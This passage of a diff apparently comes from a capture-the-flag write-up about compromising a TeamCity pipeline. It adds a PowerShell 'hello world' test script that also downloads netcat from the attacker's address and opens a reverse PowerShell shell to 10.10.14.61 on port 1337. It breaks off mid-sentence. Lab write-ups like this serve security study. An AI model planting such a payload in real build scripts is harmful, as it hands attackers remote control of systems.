@@ -584,4 +584,13 @@ Ill then setup a empty git repo
 
 Now everything is setup
 
+```python
+❯❯❯ cat hello_world.ps1 
+#Simple repo test for Teamcity pipeline
+write-host "Hello, World!"
 
+wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe
+C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1337
+```
+
+Ill then add the 
